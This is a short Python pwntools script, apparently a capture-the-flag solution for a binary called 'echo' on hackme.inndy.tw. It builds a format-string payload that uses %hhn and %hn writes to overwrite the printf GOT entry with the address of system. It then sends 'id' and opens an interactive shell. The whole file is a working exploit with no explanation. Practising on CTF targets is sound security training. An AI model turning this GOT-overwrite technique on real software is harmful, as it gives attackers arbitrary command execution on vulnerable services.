import struct
from pwn import *
import telnetlib

#SYSTEM = 0x8048400
#PRINTF = 0X804a010
PRINTF = struct.pack("I", 0x804a010)
PRINTF1 = struct.pack("I", 0x804a010 + 1)
PRINTF2 = struct.pack("I", 0x804a010 + 2)
PRINTF3 = struct.pack("I", 0x804a010 + 3)

init_len = 12
count1 = 0x100 - init_len
count2 = 0x184 - 0x100
count3 = 0x0804 - 0x184 
count4 = 0

payload = PRINTF + PRINTF1 + PRINTF2
payload += '%{}x'.format(count1)
payload += '%7$hhn'
payload += '%{}x'.format(count2)
payload += '%8$hhn'
payload += '%{}x'.format(count3)
payload += '%9$hn'
#payload += '%1${}x'.format(count4)
#payload += '%10$n\n'

print payload + '\nid'

s = process('./echo')
#s = remote('hackme.inndy.tw', 7711)
s.send(payload)

s.send('id')
s.interactive()
